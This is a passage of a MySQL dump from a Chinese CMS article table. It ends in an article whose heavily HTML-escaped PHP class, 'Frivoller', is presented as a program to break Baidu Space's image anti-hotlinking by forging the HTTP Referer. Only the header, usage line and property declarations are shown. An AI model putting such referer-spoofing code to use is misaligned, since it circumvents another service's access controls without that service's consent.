style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.body.style.cursor=&quot;auto&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;64&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;65&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;font-size:10.0pt;font-family:宋体;mso-ascii-font-family:&amp;quot;Couriernew&amp;quot;;mso-hansi-font-family:&amp;quot;Couriernew&amp;quot;;mso-bidi-font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;实现类似&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;google&lt;/span&gt;&lt;span style=&quot;font-size:10.0pt;font-family:宋体;mso-ascii-font-family:&amp;quot;Couriernew&amp;quot;;mso-hansi-font-family:&amp;quot;Couriernew&amp;quot;;mso-bidi-font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;地图的拖动效果。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;66&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ajaxRead(''map.php?mapx=''+(e.clientX-x_)+''&amp;amp;mapy=''+(e.clientY-y_)+'''',''2'');&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;67&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=', 1, 1, 0, 0, 1302533315, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(51, 1, '百度空间图片防盗链破解程序 - PHP版', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse:collapse;color:#333333;font-family:arial;font-size:14px;line-height:21px;&quot;&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* 百度空间图片外部引用破解程序 - PHP版&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* 有兴趣的朋友可以继续优化完善 :)&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* 使用方法：&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* http://yourdomain/frivoller.php?url=http://hiphotos.baidu.com/verdana/pic/item/baidupicture.jpg&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @version 1.0&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @since July 16, 2006&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;Class&amp;nbsp;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;Frivoller&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;{&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* The HTTP Version (1.0, 1.1) , Baidu use version 1.1&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var string&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $version&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* The HTTP response body&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var string&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $body&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* The HTTP URL&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var string&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $link&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* An array that containing any of the various components of the URL.&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var array&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $components&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* The HTTP host&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var string&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $host&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* The path of required file.&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* (e.g. ''/verdana/abpic/item/mygirl.png'')&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var string&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $path&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* The HTTP referer, extra it from original URL&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var string&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $referer&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* The HTTP method, ''GET'' for default&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var string&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $method&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;''GET''&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* The HTTP port, 80 for default&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var int&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $port&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;80&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* Timeout period on a stream&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var int&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $timeout&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;100&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* The filename of image&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var string&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $filename&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* The ContentType of image file.&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* image/jpeg, image/gif, image/png, image&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @var string&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;protected $contentType&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* Frivoller constructor&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @param string $link&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;public&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;function&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;__construct&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$link&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;)&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;// parse the http link&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;parseLink&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$link&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;// 